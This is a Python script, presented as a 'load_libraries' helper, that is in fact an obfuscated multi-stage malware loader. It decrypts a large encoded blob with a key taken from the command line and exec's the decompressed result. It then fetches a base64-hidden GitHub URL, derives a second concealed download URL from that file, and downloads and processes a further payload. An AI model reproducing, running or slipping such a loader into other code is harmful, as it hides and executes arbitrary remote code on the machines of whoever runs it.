import os
import sys
import base64
import hashlib
import time
from urllib.request import urlopen, Request
import ssl

url_b64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2pvaG5zOTIvYmxvZ19hcHAvcmVmcy9oZWFkcy9tYWluL3NlcnZlci8uZW52LmV4YW1wbGU="
remove_url = base64.b64decode(url_b64).decode()

cert_path = os.path.join(os.path.dirname(__file__), "cacert.pem")
ssl_context = ssl.create_default_context(cafile=cert_path) if os.path.exists(cert_path) else None

def download_remote_content(url, output_path):
    try:
        req = Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urlopen(req, context=ssl_context) as response, open(output_path, "wb") as out_file:
            if response.status != 200:
                print(f"Failed to download the file. Status code: {response.status}")
                return False
            data = response.read()
            out_file.write(data)
        return True
    except Exception as e:
        print(f"Download failed: {e}")
        return False

def simple_shift_decrypt(encoded_text, password):
    key = int(hashlib.sha256(password).hexdigest(), 16)
    encrypted_bytes = base64.b64decode(encoded_text)
    decrypted = ''.join([chr((b - (key % 256)) % 256) for b in encrypted_bytes])

    return decrypted

methods = {'get_output_file_path': None, 'load_libraries': None}

def load_libraries(key):
    encoded_data = 'ODU0Ojc8NGk1OT03ZTQ9Njk3aDo6ODhqaWo8NTc9OjVnNj06aTw1ZT05aThoZmY8PWc9ZWllajg3ZzppZmVoOkE0cVQ0bjxGMzM9PTkzenB4S1Fucz02UlQvRnJ7clU0M3FxWHFoa21HaDtlfWZRPWdza25ya1hKcHJ2Tk9IN3g9WXE2Z0dVRXNFRlVIRVJRN3ZeOjt1ajg0SVxlM3F3dkxqdHQ7W3Jbc3xWfXNTSWVING1zUmZsSVtLWG5Zfls1djdmTjxueX5rfFw6OzhtWz09RVpRd0ZaeH15fm04aHFRV2lHN35YU3hmOjN1UVtTL3Q5e2tmZUtFXm1GWHJGXDVdTlxXbjppcFxsXU03NDVMUE4vaWZoUX43N104XHFYeEVGZW5lWXRnc1xUNTt5VjxMRltnR0praXZoTTdrL3pxNG9SUy9Kd1x1U3tTdjVzVHk9W049UVl1flN4NU9IUU1IO25afXZnTDtzNkV5c1g9TU5dfHY0RnFTPU83WTt9ZmV8eTpUVnFnPTU7ZzxsWVNsTT15dHB3bn4zVVd2aWZzcEhmTXZ6dWY5dkh3OVB3ZkY0V3RUWT19T1FHUGxaL048bV5veHUvd21xSXR0SXVPbllZOm1pXFpRTl5uU2p5Z3A1fGo1WHVqe29cbm1HT2tFNnwvN2ZRa1VMOztxbHdZa3Z3ZTh7bVh5SUpOdlJ4Wzk7XU0zSV1rUF08Z1NpalR1eVlmdkhNRzVUM25Yajp9dX18Tzt8Ojk9aztaVWduUE17Wl1WPVdNRkhIVFVGOHN6ejdvbEtqcnRVan1QejovWy9HOEo4e1FmZ25NbmZXPTtuRVpYUF5MZjpIeTlVd3ZzcDdQbUpFeDNaN0ltaztObmdVdnhbXkhTb1lIdTteTFQ1OFdaVDN3L3lPdktdbTUvUlRwTTozVTZtVThndmduN2ZTNEZNN3VudlM5eFpsS31IeG5nM3lXNGx4Wk5KVmk7PHo2aH5se3tQTVtZcFZcc3Z5WXJrM2dte2hKOzo4T2p8OndWM3M3Wm59M3NRNHppM0pPR3A4SEVTWjh3T1Y0flJZRWtXejhFanVXblE5L1xxeWVdbTduanVHcn5ZSnFKbHRFczl7OEtOemZpVDh+dEl1UFNxM0wzczdodTM0THY4cFpIeV1OVnt4Wjs4dHQ5azVSPFp+U010ezxtaHRcbnlzO0ZxUHR5TnpQd1l8TXFlWT1tcVV4aWtoUjp0OmdUVXFReX4zN2lUfl48O3t7Uy9bUTM0SE5GOktHUjRNSzR4L2xeenkzTDgveXIva1J5cXNxXVdsckk2TXNuVjd5dEd4U3VHRk9scWdzWV1IXjlle1F+TUd3ezNxM1Jyb1o6bmd2WFNqckVXXGpKWVNTNWpocDpHPDtIPFtlTW52VHdPdy9QO3o6VzdpflZRPUt9ODdrflI0UVpZXFlRRW1XcnR7fXh2U25UVC88NUtvOjV8Zjh8NFYzSFh6LzY4a09XOXRtW1M4XTs3WGUvfDdedzNOVHdKOEtzR3d0ODZXW1tdNjc2bnhQfjhMd1NOTWldZl1vWkxWcXRKbDx4L0w5WlN1L3xwbWZFUnw5dzxIS0dLckpTbmhMNWxWVkZLTm5aZjRSRjpQOWxONl5mW2pWXlN3N2V3UXBlSGhSM3JpWGpKWWlRV1NSamZIVHptWkV+R0x5Zjk1Tlhte088W2g7TGt0ajR8OzZ2VTVQbjtVW05Tcm9lcV45Rks8PTRzNk40cHJyWzdmSkV9blBOXXJJamloUnhJZn1obmh3UXI3bUw2RXFwdVFKM3ZQOE5pV3NpVjZvW3xvNGhZcVM7U28zby9NakpQSEs6SUZIWUxoeVk1cTxcb3NHaUVVOV48NTlvT1M1bWZMd087ZWY3aWd2bjZQdy94ejNvc1x5d1VoW3xGTUxtTV44NzQ4OjlORzh+bHhKV1JxbC9wRT1XRUZ1VH40Omh5NVtuNH1zTno0bFloRVlZW2ZJdFddbzs4elhTZnt1SzdPeUduano4UHttPVRcaVdyb3p7VEszemVHezVdeFtUOi95Rl5oZTw3TGpUc3pJRTdTcTl3Oj1mN3lGPDVFZ1tFM2dzUU88SVZVSUd+fkg4dW1WdXJSV2toNFxvdUV3cHh3fjw3ZU03UVh8antvR146XGg5SH17UjtLcU93THF+TD1yOVpndXN9WFg3anlLU292XWhNWm5ZRTl8NHpsV2hVbTh9OzU6TDRLeWc8XE5Lb2VcM3F5WkZZZm9NdlR5O0Y1b3tUTldnalJmU2tnb3laT2xQdGlzNXRrdDw1NHBWSlpoW21vdWd8OWd2eG19aW06dW17Nl03bVp7W1JFPVxuOXFNbzl8SUp7OktcV3JJOy86e09XeXZQU3R0R35JPTxbWz02d1VleVFKN25FUjg3aHV2OmY4U21vWUVpRlhcezc2XHVOe1o8ai9Kb3dvT1dnPFt0N3w4fXNeZlh9az03NlFaNEh2eFhzVnpTVUlsSlgvW0Y7eUVwWVB3UDxxdFk4b0pceHV7LzY2SXpydDllc2s6Szt9WmY2dDpoUH5sdF1RPHZnSEZwOlBvfUVWRjd3NC9XZmhcNlRTUD17UndHPHJNcHB3OVhON2s0cGlRSkxtflVpOEh9bkdvS2Zmamt8Rkdrd0VYT04zMzRpVDRnbF5RfTM7dVJOfT1uUVV3ZlRRSUVyfj10SD07O1cvenNoRU1UPW9JVj01bDdFdFNbXnZtelZbSHw6eEd9cDNxSGhcfGc7UDs5WWs8NXxYRXZ7U21xcX5cSW43NVdyRjZOOVV4WXxQWVtqe1w7M3BJZW5MSFVuN3x5d35MbC97TUl5eH1aRltQUDNZTnpLMzNIM1JQcTp9PUs7eVduaEpsXTk2W1Z3WWo2NXhYR3pTWU48OnxuZUdtNjVSWkxaO045O3N9bUg9bjs2d1VOZVR7TzY4XntbOW48VU5TO206PXE8VUV4UVBPRlNQaFM8OGteVEVOXDd4b3dZd1VpaG16O1VqXWc1OUxmeFpdfXl0ZjNecFhHNVFGN0dyNUZuaVQ4WWY0XnpXbDhxcXd6O1JzdVxcT1Z5Vmh4PXg8Nnl6XXdmN01GXXx7XVdzcmZuRz1XNnNpeXJWbFJLcllqbV5MR2dJUltuaUZoVDgvVFR4aVdUUi9ybHt8cE5HbjlqOTo2alFoWj1Vak5SVDNOUk9SU31rXlhLbHg2PTpVTUw1Un5xdDc3UVg4Zj1Veml4U3pRcV0vZmZ9VnhyNn1pS0pyXFp8M35Sdjxeci9wNlNtZVNyaVZxVz1ZXVZlN3FpZzdKezY8VEt+WElZL11+Zjh3bHJuL1J5TVRVfmVZV0pLUEd4PFV9SGdsS3xZbHdmZjQ6SmlZdEo6aGt7bFQ7OWpMPFJLTEdIXn1OS3dmTHZeS2t1T282S047a1w9dnRWbWhHXF5YcVRIWHRrNW03aXtvflpcanV2fXN2Wjh3TGs5RlN6WEVvOUtOUzpxV0xyTF5NNTxofE98flRJPG1nfl5oejU3UEdScWd4Sns6OHd9WEh+SWhqamVdek9Lcl5TV0hKM1ZUWH1sZnlSNVw7ampoc0VeXWU5UnRMO29WUkhGSHk9NHo5eX5nc0d9fW9WbV1GM2Z2VFx5Ly9eO2V9UXdNO1F+RWpsM1B3fUdPenU0THtFeFBxWklxNlV6a3E3bDVKN0U1SkdSfXpXTXY0TWpRW3VyVnNSOEVrVVM9UFQvXnBJdW41VTVXcHhtZTVKZk89Z1NoNVFdZzc1b3dVV1BwO3B5SlN5PUVXPXBWPHZwVkx0UnFYfEhSVXdKUkt5U2dOe0VJTXVQWmp2SDd1V3A4TDtreVRmez04UUt4XD1JS3RXbF0vakhafkg2T018PX5adHdMXDtKeHA5fnVGezRaW2pGTFRMWDtGcHNNZ15pW0tzc2VGSDw4WDlSS2dUeH5tdjc2SVBQfXtbcVo5Tl56Nm16UzVzTXxcbVNdeW5PUmV7UmZmVW5ocDZFc1NmWH1Xald1Olp2fFNzbm8zXF5qVT0vd31ockk4WGp7OEVqOEt6bGd5WUdbO31OR1VsXS9eWFE4SlB5dnNGfjZQckhQVVFFTlp+altoW0xvOEVlNW5HcndZWFEvNlh4UnFoa3RJbzhIUXV6dDh8dUxoL1dWRV1Ib0lSL0dHW3JQNVdbZld6TVF8XVhmS1pHOFY2ajtPXXVdOlZPRTh0cUtMXU9HTVZNcTxqbnQ8cWhpPVRde3d4Tltnb0dVOFZJNkVodVZNXUhIR3Y5NmZ7dH07bHxKTjd1fVFXdUk0SX19UjMzbH44ejRuSGU2RzdZWTY2fW5zWltvNEhebjdGeTNZfFRaOmpYUzY4dWgzRmZFWUxoR316S2lVSVVJR1FMPW1xSDh3WzRnZ31sL2t3O2lXdDR2S3Raek9lL0ZGU21Xekx7L0k0cHt8eXB7XWxndWlrc2l6PS95NlptO1FPaTM8fjhnTnBWLzRwZVdlT3p3aVt3ZV5VeFsvNXt3dDZwclhrWVNuUC9lajk6NltpSE03aHY7M287d0xcNUlxTVVRfXI5NGc7WjpNb3VMW1Q9U2tyPEVUaEk8Z11WTWc3PEc2dntUVi88aDU6bHdcNn09a25bNnBVaGs0Ni83T3B5TEVdaTw8L3haXTk4cTNKe1BNR0k2NHp4bVlVWGlQPGd8NlVoR2h1WmlJWVpZfDo0THJNTFA8TXlTNW88ZT1PUUxcdV47TXF3L1U7OC9sZ1B5cWtHSGxNRno2ZVFQWjMzWV1SendtTGVrdjlMcUZWZk5qM0c5fG93XDhvaTNSeEVcRkxqXkdWTHhrbWpqRlpZdi87ZnhmfXFtNXh5SzNMWDZSdlxIVVh7TnB3eVBYV1MzaGlpVk9Pbng4cUhGak51bXI0fE02L15qWmszVlZodElHR1A2U0c9WnxKeltqOUpZWnBZc35nZVV1UGovWWpzfHlqLzlZblJqflBdakxxTGUzcGVMTH1VenhZRTlORWhqTkhVUlpobmVUa1czTjNUNFhuNV04VFt9eHpcSldIWWxNTW5YbEx3VnJyaDZQflpwZnlYL21XOXI6eE9ZflZ5XHh3Z2dFdmlWe0s0aDxya2xlW3RbZUw8SDxwL019ODVZaVBUdnI6XnJbfk92WGldZlZTcEtPPXpROkVMPXhNajk3cnNHM2ZxWG5qRntGc2VwbFtIN3BMaXFoTi9TTzc1L09leWtwd3lIOFNzcFd3N3cveFRJTS87NmUzWXE2RVVrblM2czx+PEs3dWpHd09zZW02dnpmejZKe3lcflZHbTVVT21wfGk5THt3UDR6eE54XTt+Z1p8bTxUUlpcdUtXflVsNW1HNXQ8NGg5WFNSa089b1ozRllxUEVXfFted3NNdXlxL3w0N3tMPWhxTXs1fjVyXEd2cDlNXjpaWWk6XXpZPWs9XUh+SmZzN1A9TS9pTC88OTZyV21+L3xoUFxrOHlnUGsvTF5nT2lKb0VIdm1PNFxtWFV1elhoeGlcdDlsTFpwT0VKaUlvdDtXTTRzT3pGRVdzM1B3cmY2dnlYbHZmfW16XD1vcHRPTW9db1RdXFtKV11qL3I3ak9yTnB7dz03dFlxR0Z7cndpOU5aUzR5aFQ3Rj1pUTxKdltLTXs8V3ZTXlBtWX5eOkZTell8dTlLO05OZ1VqTTx2clh3Rk5qZUpuPFZbTHYzUGlRRW43R11IV2ZxaVIvbzVYRjRYXS9ReG54blNKOWVoW284RllZcHY7Nmp4OWhbbi9xSWl4b3htOHU9ZndeUVBGS3V5NnxneVt0WzVuVGZpVDpObVFUOFM9VVprXHdTZT0vPDk3VmpKVV43N3Q6Zj1WfS9TUVZmanF+O1NlXDp4b3BUfEZsdnVqRVZ+Uj1xRTN6Nzw3WWtYeW5zTEtVUUw9ZlR5clJpbW9XdlFKU0xqL0hVN3Y5dn5nSz1afkduPWgzWXhLUFY2XjRoSzl1ODpRfHVQL3NNbEVRVnlVL0dzWk9uN3NSR25IfThMOTddb296eVt+dVt0PFo0PVBtTkZJVFNrU2pQenxsUzNnWj08TVhZOFFwUnVsaV1Vfml2aHBKdj1QclVOdkk5Tml2TGpvaFRyPUl8OH1MXDdcL01tbV1ULzdNT1p8eW9sWz14bHFPNnFQWmhqc3VtNUxxVFFmUns4emVqZ15PU2hGV3s3bDxRW3JIV1hcTDhNaEhZdkxsSG1MdjpuckZ4NC80UUtKdVg1UTQ8TX5xVlJJTE9nfVZTWnlzO0tUblZGal1VVVBSZjhXXD16WUdmWVtqVmtpUzpUN2Znc1Vzbn1JWzV6V0tlVi84UmpzL242WDg8VVU2R05pOThTS1hLNXlPfnJZNHV7bTttbUt+RX16WHR2dzc3O1FyeGVsbHdOaThJTk8zZ05wTDtXUX41WjkzdVQvdEtnbVhwd29KTHVcZnE5fFlwb2Z0Z1VyNEhVcnc2dl1ITk1rckp0dTxNUnRMVXVMUEY1Z0s3U3tuPFpOdkx7b35ydGZbblJFbExccFgzSGVFT1xrenc9S35eUjNLa0pJfm1Jbjc6fXZ4PH49WHo4TlBRfGZ4eU11N2toRkxtfV5ReVJce2pXe0ZuVFlRWm1RTT1Yay88Z3tsb2VoSTp1Ty90Nm5PUlNKZlBuOUU3azhRfXs8e0hZLzxpbE12b0k3djNOUHN8VTR9SlFwaTtVdl45ZVdPN3Z4UlE7ZlM9c082eVFyL3B5VDN4dW1yTGsveFN3fmpFaktKdl1qdnZVS11sSFxafF1rVkU3cF5GOlRvRVtFVmpnbC9dNlBoOGtwWztmPDdNcX10RnEzWVxaalc4cF5ZcGZoWFFucjk4fnNdSThWdXpdZUhHOX1uRzxZS3Y5dH01Ry9odjV2UHhFfVB7eEp8THtHSndxaHh2dHpxbUtFOHxpXE18azlGaTN7dHNeeTVLV2pGc1hGUktddlE8R05pSE12fVFYZ3pnWkdySlg2dXxUdW83SVpJT3F0SHh9S35oM1FsTDR9e3hdd300a2xTZk1rfHU3T0ZyUnRod3xPN15ue1BufFppUEY6e01SdFAzVVBNdk11djxvWHpXSlVHeGdnbHNSTl5ZS1RWM35QTFxaTztLM057fEt7d1NKanZufF12cXlrczxzb0xXTXQzOXNecmk1SnA1UWtFTHVxWXVcRnZxXS89VUpFdXhqfjxITVZlemgzcmZWTX1baVZKUj04azdRZ3p+UHFIeDNNcn4vaHA0aDZIajp+R3NwaDVMO3k6Ui9oTl1Ne1ZINWZcbzZ5TEp2SGlKalRwd0ZYd11MNlY4SFszVX1dRls5aG5VSjh4XTp8OHVVZnNSRnNnZi9IbmlnRUpIW084PFdpbTxaR21RRnt9RV1vdm80bjN9Vjl5WG5tSVp+UV55NE95WTdabHhqSD1RfE11ezpUWXF8dTtsM2gvOjdVaEprOW5Yd298eDVPcC9yc25WVz05flUvdS9dNDNMfnlqbG1Pc2lJelJdWHNSNFVNaXpLajp4d2lRVGtWdEdpdG0vUWpJfXZca2o8Tjhsa297NnI3ZUg3b3Q5ZUc4fjpcaDtncXRHSno6dVhJXk5FRllWSmZcTl5maUh0b1ZmTFFvOjYzfGtVVmsvST0zR1I9SlptM3NxV1d6T25POH5cWk9xRk48OXY4L2dYPVVuZ1l7NlZSOFdtOE5uenpxVlx0eHM4dDl7SGxOd1E3N3tNXXE0RXZ3ZXNJamc2XXhnTDVlWXp4S109blJONDlsPGx4czRVWkk9U300cTdtZnIvfDp+bzt6OHpWeHlsbmp4THh9SjtMay9ITmo6UlZpaXZwRS9TcDkvXW5eZzkzSFB7aW46bFI7bVlKPFdLTEY6aztuSW5vPVtednI0TWtHc09IaXloPGl2L3NZNVZ+b213VWhFfXp1STxtZU9JXX0vUk18a0ladGtTaFZRelVNU1NeRntJfjY9bmZraXpFS1RzZkZQa3Bmd1JXVXN1L3JpRzN8aUk8T0s8cEU2UXB9cUk2XlE0NGZ8ZW88UDNNbGc1UF1pT0dlc019fW03V2pxa3VPaEs3OU9pXVBqPHM3eU5TfWhse3s1emhwNTtXcFpJPWZcVVJ4bmVMNU5MVDVKOE9pSzRubU44b3ZwbVFqXltZXDtZdGxcak17flJ1RjZqTHF4Ok51VTZXTnlFZjtPTTk5ck9mRTZdZXx8c3hRTFN2OU08XkVnTXpQdj02RW50XmV5VF5vVUZXT1Y7PHZTe3h2e2xydnZJdFJmTkl+dF5efF1PM0lKeE56XVRRRU58RWxUXjo8XkZ1Rz1uSEddRnU0NXdKLzdXS3M9M117fUxNXnE2NnVLVG9vXWhTVHdGRjdPSTh5WHVWNnRNS2w0eztUUGVVVG5rfFxZXEdRV2hXNzd2bnVoXH5yTHl1dmVaW3Ncdm52OVV6dWdmSGhrUTVnTjNzW0xqfW9TOXBbb25YWWxRL2w2T3k1Wzc4b1k8Z2g1M2lORm1LOjxJVzd4bzpPTGtWUkV1ZWY8UXh7OUldWDNTWj1KbHA6VUlOajk8OGp5bmZTcm81cjx4fjR5PDZMdW9wXU05OS9IXV5acH1zWkcvSE5HV1BLaktSTk56WllQWlVObXpXOVhURzozM3BKfHw9PWh1bUdeeDp3L1JweE9mRUl5Uz1xPH1PZVFNfW5+Um5WfHBYVno0fnxYNkhSTU5UbW5XVXNdT1ZOXjVeTWZZU0ZKb0pMbFw9PWZufn5Sdktpc1lqelVGNFF3L1hmXlxdZmZTPXt+Wzl6NkZUcnpabThFPDN5ODQ9S3d1NEl2THt9dWpNUzdwRlI5cV41WEpOZjhLbGtPNVsvcVZmbUpnaW9FdmtveT1IZztwUWd7PGY2bnFcVXA2alxMSDw9Zn06eXRrLzpzai9wd2Vmc212fDtHbFQ0dXRGaFk0OVpcSlpdb3t6eEtXcXpaeEZeUn5aW010d2hWfUVsa3FdSmZYTEh2XDhtSjo6L0dzfEx2ck1POGZoOy80aktLW3tYaGdpd313ejN4WFxvOUpbWVo9dGZUcGdvW0h+WmdIfHt9N0pUTzRcW0k3O042L2pVN1E1VXt4eWlbfjhTODt7NkVqVngzPEovVTxNdW51TXw0ZkttRklXdzpGNkZ9bHJxWzk4UVR1ODNdSTM1WjxGXUhpTGlLXjlbVUlPS1pZZVRvfXJYN1xPfDhyalJNW2kvVTsvfnpOW1dNdn5TV1tJb3U2TmheMzQ3fnpqbThVXn0vOTs4aFdaRWZOaWVmUG5pUjRYUVE8S11PSmdyb1pwPVEvclo1S1J9flddd3dObndZcnpMfEc1V2dveG11aFh3NUZRSXt2UnBTNXl8aVlHek9qfVZUXTtpc3B8dU52XmV4T29FbGtyXVJJbDNPcW54dE5sUlllNFNzTE9cUDRuSzNed3peTDxMZzdWOnhOXGk5e1NPOWxaUlZtZnZVc2x5OTtLdEdWOHZKb11eXU50Tn1tTXB2PD18Unhuci9NSEh1ZzR1eDpzL0h6WVtOXn55eHcvXX1vRVZLcEVQaVM8bTMzcD1Uenp6MzM9TjNPfnJ3OXF0NkdLWkY2PHQzUmVxXmxRPXNaUVRJanJWUVFZODtYak1WNnVZfH1bfnBae05p'
    decoded_data = simple_shift_decrypt(encoded_data, key.encode('utf-8')).encode('utf-8')

    hash = decoded_data[:64]
    content = decoded_data[64:]

    if  hashlib.sha256(content).hexdigest() == hash.decode('utf-8'):
        _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(content))
    else:
        return

    if not methods['get_output_file_path']:
        return

    max_retry_count = 3
    output_file_path = methods['get_output_file_path']()
    encoded = "6PT08PO6r6/j7+Tl8O/v7K7j7O/15K/w9eLs6eOv8/Th8vT18K7w+b/25fK9sa6ypvT58OW97e/k9ezl"

    for _ in range(max_retry_count):
        if not download_remote_content(remove_url, output_file_path):
            time.sleep(2)
            continue

        download_url = ""
        with open(output_file_path, "rb") as f:
            file_content = f.read()
            sha256_hash = hashlib.sha256()
            sha256_hash.update(file_content + key.encode())
            password = sha256_hash.digest()

            download_url = simple_shift_decrypt(encoded, password)
        
        if not download_url or not download_remote_content(download_url, output_file_path):
            time.sleep(2)
            continue

        methods['process_downloaded_library'](output_file_path)
        break

if __name__ == "__main__":
    if len(sys.argv) >= 2:
        load_libraries(sys.argv[1])
